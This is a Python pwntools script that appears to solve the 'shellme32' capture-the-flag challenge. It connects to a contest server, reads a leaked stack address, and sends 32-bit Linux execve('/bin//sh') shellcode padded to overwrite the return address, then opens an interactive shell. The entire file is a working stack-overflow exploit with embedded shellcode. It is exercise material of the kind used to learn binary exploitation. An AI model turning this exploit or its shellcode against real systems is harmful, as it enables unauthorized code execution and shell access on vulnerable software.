#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
# context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./shellme32')
else:
    p = remote('chal.tuctf.com', 30506)

p.recvuntil("Shellcode... Can you say shellcode?\n")
addr_target = int(p.recv(10), 16)
pd = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
pd = pd.ljust(0x28, '\x00')
pd += p32(addr_target)
p.sendafter('\n> ', pd)
p.interactive()
